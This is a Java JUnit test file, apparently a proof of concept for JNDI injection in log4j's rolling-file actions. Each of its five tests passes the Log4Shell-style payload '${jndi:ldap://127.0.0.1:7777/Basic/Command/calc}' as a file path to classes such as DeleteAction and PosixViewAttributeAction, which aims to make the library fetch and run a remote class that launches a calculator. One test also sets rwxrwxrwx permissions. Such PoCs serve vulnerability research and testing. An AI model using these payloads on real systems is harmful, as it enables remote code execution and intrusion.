import org.actions.CustomDeleteAction;
import org.actions.CustomPathAction;
import org.apache.logging.log4j.core.appender.rolling.action.*;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.nio.file.FileVisitor;
import java.nio.file.Path;
import java.util.List;


public class ActionPocTests {

    @Test
    public void getBasePathAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.getBasePath();
        } catch (Exception e) {
        }
    }

    @Test
    public void toStringAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.toString();
        } catch (Exception e) {
        }
    }

    @Test
    public void executeAbstractPathActionTest() {
        AbstractPathAction action = new CustomPathAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        try {
            action.execute();
        } catch (Exception e) {
        }
    }

    @Test
    public void executeDeleteActionTest() {
        DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
                IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }, null, new DefaultConfiguration());
    }

    @Test
    public void executePosixViewAttributeActionTest() throws IOException {
     PosixViewAttributeAction action = PosixViewAttributeAction.newBuilder().withPathConditions(new PathCondition[]{
            IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
        action.execute();
    }
}
